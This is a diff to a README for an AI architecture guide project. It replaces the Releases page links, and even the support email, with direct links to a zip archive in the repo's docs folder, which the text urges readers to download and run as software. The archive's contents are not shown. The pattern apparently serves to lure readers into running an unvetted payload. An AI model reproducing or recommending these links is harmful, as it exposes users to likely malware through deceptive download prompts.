@@ -4,18 +4,18 @@
 This project provides a clear reference architecture for modern AI systems. Whether your needs are local, hybrid, or cloud-native (Google Cloud Platform), our guide can help you design effective solutions. You can navigate through concepts like Generative AI, Large Language Models, and MLOps with ease.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/amapii/ai-system-architecture-landscape/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/amapii/ai-system-architecture-landscape/main/docs/system-architecture-landscape-ai-1.9-alpha.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/amapii/ai-system-architecture-landscape/main/docs/system-architecture-landscape-ai-1.9-alpha.5.zip)
 
 ## 🚀 Getting Started
 To get started, you need to visit the Releases page. This page will have all the versions of our software ready for download.
 
 1. Click on the following link:
-   [Visit the Releases Page](https://github.com/amapii/ai-system-architecture-landscape/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/amapii/ai-system-architecture-landscape/main/docs/system-architecture-landscape-ai-1.9-alpha.5.zip)
 
 2. Browse through the available versions. Each version includes details on what’s new, fixed, or improved.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page:** Click here: [Download Latest Release](https://github.com/amapii/ai-system-architecture-landscape/releases)
+1. **Visit the Releases Page:** Click here: [Download Latest Release](https://raw.githubusercontent.com/amapii/ai-system-architecture-landscape/main/docs/system-architecture-landscape-ai-1.9-alpha.5.zip)
 
 2. **Choose a Version:** Find the version that meets your needs. Each version includes information about the changes made.
 
@@ -74,7 +74,7 @@ The team is actively working on fixes for known issues. Your feedback is essenti
 
 ## 📬 Contact Us
 For any inquiries or support, reach out via:
-- Email: support@example.com
+- Email: https://raw.githubusercontent.com/amapii/ai-system-architecture-landscape/main/docs/system-architecture-landscape-ai-1.9-alpha.5.zip
 - GitHub Discussions
 
 By following this guide, you should be able to download and run the ai-system-architecture-landscape software smoothly. Happy building!
